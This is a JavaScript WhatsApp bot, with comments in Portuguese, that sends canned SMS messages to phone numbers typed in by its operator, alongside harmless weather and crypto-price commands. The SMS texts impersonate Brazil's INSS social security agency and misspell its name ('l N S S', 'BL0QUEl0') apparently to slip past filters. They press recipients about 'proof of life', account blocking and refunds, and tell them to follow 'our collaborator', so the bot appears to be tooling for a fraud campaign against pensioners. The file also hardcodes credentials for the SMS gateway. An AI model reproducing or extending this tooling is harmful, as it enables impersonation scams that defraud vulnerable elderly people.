import pkg from 'whatsapp-web.js';
const { Client, LocalAuth } = pkg;
import qrcode from 'qrcode-terminal';
import axios from 'axios';
import dotenv from 'dotenv';
import fs from 'fs';

dotenv.config();

// Remove a pasta .wwebjs_auth para forçar nova autenticação
try {
    fs.rmSync('.wwebjs_auth', { recursive: true, force: true });
    console.log('Sessão anterior removida. Pronto para nova conexão.');
} catch (error) {
    // Ignora erro se a pasta não existir
}

// Inicializa o cliente WhatsApp
const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: {
        args: ['--no-sandbox']
    }
});

// Gera o QR Code para autenticação em formato grande
client.on('qr', (qr) => {
    console.clear(); // Limpa o console antes de mostrar o QR Code
    qrcode.generate(qr, { small: false }); // Usa o formato grande do QR Code
    console.log('\nPor favor, escaneie o QR Code acima com seu WhatsApp.\n');
});

client.on('ready', () => {
    console.clear(); // Limpa o console
    console.log('✅ Bot está pronto e conectado!\n');
    console.log('Comandos disponíveis:');
    console.log('!sms - Lista todos os comandos');
    console.log('!sms1 até !sms8 seguido do número - Envia a mensagem específica\n');
});

client.on('disconnected', (reason) => {
    console.log('Bot desconectado:', reason);
    process.exit(1); // Encerra o processo para permitir reconexão
});

// Configuração das APIs
const WEATHER_API_BASE_URL = 'https://api.openweathermap.org/data/2.5/weather';
const CRYPTO_API_BASE_URL = 'https://api.coingecko.com/api/v3';

// Mensagens predefinidas
const mensagens = {
    'sms1': 'l N S S : PROVA DE VIDA EM ANDAMENTO , SIGA AS INSTRUCOES DO NOSSO COLABORADOR.',
    'sms2': 'l N S S : EVlTE o BL0QUEl0 e finalize sua Prova de Vida.',
    'sms3': 'l N S S : SOLICITAÇÃO DE RESSARClMENT0 FEITA , CREDlT0 EM CONTA em até 24horas.',
    'sms4': 'l N S S : Aguardando Confirmacao para finalizar o RESSARClMENT0.',
    'sms5': 'l N S S : EST0RN0 DE SIMULAÇÃO.',
    'sms6': 'l N S S : PROVA DE VIDA EM ANDAMENTO , CONFIRMACOES 1/3. SIGA AS INSTRUCOES DO NOSSO COLABORADOR(A).',
    'sms7': 'l N S S : PROVA DE VIDA EM ANDAMENTO , CONFIRMACOES 2/3. SIGA AS INSTRUCOES DO NOSSO COLABORADOR(A).',
    'sms8': 'l N S S : PROVA DE VIDA EM ANDAMENTO , CONFIRMACOES 3/3. SIGA AS INSTRUCOES DO NOSSO COLABORADOR(A).'
};

// Configurações do servidor
const API_CONFIG = {
    baseURL: 'http://localhost',
    user: 'luizsoldi777',
    password: 'QSX12az@'
};

// Função para validar número de telefone
function validarTelefone(numero) {
    // Remove todos os caracteres não numéricos
    const numeroLimpo = numero.replace(/\D/g, '');
    // Verifica se o número tem entre 10 e 11 dígitos
    return numeroLimpo.length >= 10 && numeroLimpo.length <= 11;
}

// Função para enviar SMS através do servidor
async function enviarSMS(telefone, mensagem) {
    try {
        const url = `${API_CONFIG.baseURL}/proxy.php`;
        const params = {
            user: API_CONFIG.user,
            password: API_CONFIG.password,
            destinatario: telefone,
            msg: mensagem
        };

        const response = await axios.get(url, { params });
        
        if (response.status === 200) {
            return { success: true, message: 'SMS enviado com sucesso!' };
        } else {
            return { success: false, message: 'Erro ao enviar SMS.' };
        }
    } catch (error) {
        console.error('Erro ao enviar SMS:', error.message);
        return { success: false, message: 'Erro ao conectar com o servidor.' };
    }
}

// Função para formatar a lista de comandos
function getListaComandos() {
    return `*📱 Lista de Comandos Disponíveis:*\n\n` +
        `!sms - Mostra esta lista de comandos\n` +
        `!sms1 [número] - Prova de vida em andamento\n` +
        `!sms2 [número] - Evite o bloqueio\n` +
        `!sms3 [número] - Solicitação de ressarcimento\n` +
        `!sms4 [número] - Aguardando confirmação\n` +
        `!sms5 [número] - Estorno de simulação\n` +
        `!sms6 [número] - Confirmações 1/3\n` +
        `!sms7 [número] - Confirmações 2/3\n` +
        `!sms8 [número] - Confirmações 3/3\n\n` +
        `*Exemplo de uso:*\n` +
        `!sms1 11943800293`;
}

// Função para obter previsão do tempo
async function getWeather(city) {
    try {
        const response = await axios.get(WEATHER_API_BASE_URL, {
            params: {
                q: `${city},BR`,
                appid: process.env.WEATHER_API_KEY,
                units: 'metric',
                lang: 'pt_br'
            }
        });

        const { temp } = response.data.main;
        const { description } = response.data.weather[0];
        return `🌤️ Tempo em ${city}:\nTemperatura: ${temp}°C\nCondição: ${description}`;
    } catch (error) {
        return '❌ Erro ao obter previsão do tempo. Tente novamente mais tarde.';
    }
}

// Função para obter cotação de criptomoeda
async function getCryptoPrice(crypto) {
    try {
        const response = await axios.get(`${CRYPTO_API_BASE_URL}/simple/price`, {
            params: {
                ids: crypto.toLowerCase(),
                vs_currencies: 'brl',
                include_24hr_change: true
            }
        });

        const data = response.data[crypto.toLowerCase()];
        return `💰 Cotação ${crypto.toUpperCase()}:\nPreço: R$ ${data.brl.toFixed(2)}\nVariação 24h: ${data.brl_24h_change.toFixed(2)}%`;
    } catch (error) {
        return '❌ Erro ao obter cotação. Verifique se a moeda existe.';
    }
}

// Processa as mensagens recebidas
client.on('message', async msg => {
    const command = msg.body.toLowerCase();

    // Comando para listar todas as opções
    if (command === '!sms') {
        msg.reply(getListaComandos());
        return;
    }

    // Verifica se é um comando de SMS válido
    const match = command.match(/^!sms([1-8])\s+(.+)$/);
    if (match) {
        const [, numeroComando, telefone] = match;
        
        // Valida o número de telefone
        if (!validarTelefone(telefone)) {
            msg.reply('❌ Número de telefone inválido. Use um número com 10 ou 11 dígitos.');
            return;
        }

        // Obtém a mensagem correspondente
        const mensagem = mensagens[`sms${numeroComando}`];
        if (mensagem) {
            // Tenta enviar o SMS
            const resultado = await enviarSMS(telefone, mensagem);
            
            if (resultado.success) {
                msg.reply(`✅ ${resultado.message}\n\nMensagem enviada para ${telefone}:\n${mensagem}`);
            } else {
                msg.reply(`❌ ${resultado.message}`);
            }
        }
    }

    // Comando de tempo
    else if (command.startsWith('tempo ')) {
        const city = command.split('tempo ')[1];
        const response = await getWeather(city);
        msg.reply(response);
    }
    
    // Comando de cotação
    else if (command.startsWith('cotacao ')) {
        const crypto = command.split('cotacao ')[1];
        const response = await getCryptoPrice(crypto);
        msg.reply(response);
    }

    // Comando de ajuda
    else if (command === '!ajuda') {
        const helpMessage = `🤖 *Comandos disponíveis:*\n\n` +
            `📍 tempo [cidade] - Mostra a previsão do tempo\n` +
            `💱 cotacao [cripto] - Mostra a cotação da criptomoeda\n` +
            `❓ !ajuda - Mostra esta mensagem\n\n` +
            `*Exemplos:*\n` +
            `tempo SP\n` +
            `cotacao BTC`;
        msg.reply(helpMessage);
    }
});

// Inicia o bot
client.initialize(); 